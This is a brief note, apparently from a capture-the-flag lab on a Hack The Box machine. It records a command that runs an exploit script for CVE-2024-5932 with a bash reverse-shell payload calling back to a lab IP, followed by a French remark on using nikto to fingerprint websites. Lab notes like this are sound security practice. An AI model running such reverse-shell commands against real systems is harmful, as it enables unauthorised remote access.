python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"


![[IMG-20260115182823570.png]]



nikto binaire pour footprinter un siteweb et vérifier plein de chose